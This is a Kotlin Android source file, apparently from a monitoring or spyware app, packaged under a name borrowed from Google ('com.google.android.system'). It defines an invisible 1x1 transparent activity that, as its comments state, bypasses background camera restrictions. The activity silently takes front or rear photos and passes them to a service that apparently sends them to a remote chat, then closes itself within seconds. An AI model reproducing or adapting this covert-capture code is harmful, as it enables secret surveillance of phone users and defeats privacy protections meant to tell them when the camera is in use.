package com.google.android.system

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import com.homemonitor.BackgroundCameraEngine
import android.graphics.ImageFormat
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream

/**
 * InvisibleCameraActivity
 *
 * 1x1 Pixel Invisible Activity that brings Camera Lifecycle to RESUMED state,
 * bypassing all background CameraX/Camera2 policy restrictions.
 */
class InvisibleCameraActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "InvisibleCamera"
        const val EXTRA_CHAT_ID = "extra_chat_id"
        const val EXTRA_IS_FRONT = "extra_is_front"

        fun takePhoto(context: Context, chatId: String, isFront: Boolean) {
            try {
                val intent = Intent(context, InvisibleCameraActivity::class.java).apply {
                    putExtra(EXTRA_CHAT_ID, chatId)
                    putExtra(EXTRA_IS_FRONT, isFront)
                    putExtra("lens", if (isFront) "front" else "back")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch InvisibleCameraActivity: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make window 1x1 pixel transparent at top-left corner
        window.setGravity(Gravity.TOP or Gravity.START)
        val params = window.attributes
        params.x = 0
        params.y = 0
        params.height = 1
        params.width = 1
        params.alpha = 0f
        window.attributes = params

        val lens = intent.getStringExtra("lens") ?: ""
        val isFront = intent.getBooleanExtra(EXTRA_IS_FRONT, false) || lens.equals("front", ignoreCase = true)
        val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""

        // Safety self-destruction timer: guarantee finish in <4.0 seconds under all edge cases & retries
        Handler(Looper.getMainLooper()).postDelayed({
            try { if (!isFinishing) finish() } catch (_: Exception) {}
        }, 4000)

        capturePhotoResumed(chatId, isFront)
    }

    private fun capturePhotoResumed(chatId: String, isFront: Boolean) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            finish()
            return
        }

        val handler = Handler(Looper.getMainLooper())
        val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK

        try {
            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
            var targetCameraId: String? = null

            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    targetCameraId = id
                    break
                }
            }

            if (targetCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                targetCameraId = cameraManager.cameraIdList[0]
            }

            if (targetCameraId == null) {
                finish()
                return
            }

            val imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2)
            val photoFile = File(cacheDir, "photo_${if (isFront) "front" else "rear"}_${System.currentTimeMillis()}.jpg")

            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    FileOutputStream(photoFile).use { out -> out.write(bytes) }
                    Log.i(TAG, "Resumed Camera2 photo captured successfully: ${photoFile.absolutePath}")

                    MonitorService.sendPhotoPublic(chatId, photoFile)
                } catch (e: Exception) {
                    Log.e(TAG, "InvisibleCamera capture error: ${e.message}")
                } finally {
                    finish()
                }
            }, handler)

            var retryCount = 0
            val maxRetries = 3

            fun doOpenCamera() {
                @Suppress("MissingPermission", "DEPRECATION")
                cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val surface = imageReader.surface
                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(surface)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            }

                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                                val outputConfig = android.hardware.camera2.params.OutputConfiguration(surface)
                                val sessionConfig = android.hardware.camera2.params.SessionConfiguration(
                                    android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
                                    listOf(outputConfig),
                                    { it.run() },
                                    object : CameraCaptureSession.StateCallback() {
                                        override fun onConfigured(session: CameraCaptureSession) {
                                            try {
                                                session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                                    override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                        try { camera.close() } catch (_: Exception) {}
                                                    }
                                                }, handler)
                                            } catch (e: Exception) {
                                                Log.e(TAG, "InvisibleCamera session capture error: ${e.message}")
                                                try { camera.close() } catch (_: Exception) {}
                                                finish()
                                            }
                                        }

                                        override fun onConfigureFailed(session: CameraCaptureSession) {
                                            Log.e(TAG, "InvisibleCamera session onConfigureFailed")
                                            try { camera.close() } catch (_: Exception) {}
                                            finish()
                                        }
                                    }
                                )
                                camera.createCaptureSession(sessionConfig)
                            } else {
                                camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                    try { camera.close() } catch (_: Exception) {}
                                                }
                                            }, handler)
                                        } catch (e: Exception) {
                                            Log.e(TAG, "InvisibleCamera session capture error: ${e.message}")
                                            try { camera.close() } catch (_: Exception) {}
                                            finish()
                                        }
                                    }

                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        Log.e(TAG, "InvisibleCamera session onConfigureFailed")
                                        try { camera.close() } catch (_: Exception) {}
                                        finish()
                                    }
                                }, handler)
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "InvisibleCamera openCamera onOpened error: ${e.message}")
                            try { camera.close() } catch (_: Exception) {}
                            finish()
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        try { camera.close() } catch (_: Exception) {}; finish()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        try { camera.close() } catch (_: Exception) {}
                        if (retryCount < maxRetries) {
                            retryCount++
                            Log.w(TAG, "InvisibleCamera HAL error $error (in use/busy). Retrying open attempt $retryCount/$maxRetries in 250ms...")
                            handler.postDelayed({ doOpenCamera() }, 250)
                        } else {
                            Log.e(TAG, "InvisibleCamera HAL error $error after $maxRetries retries")
                            try {
                                MonitorService.sendCameraError(chatId, "Camera unavailable (HAL error $error)")
                            } catch (_: Exception) {}
                            finish()
                        }
                    }
                }, handler)
            }

            doOpenCamera()

        } catch (e: Exception) {
            Log.e(TAG, "InvisibleCamera exception: ${e.message}")
            finish()
        }
    }
}
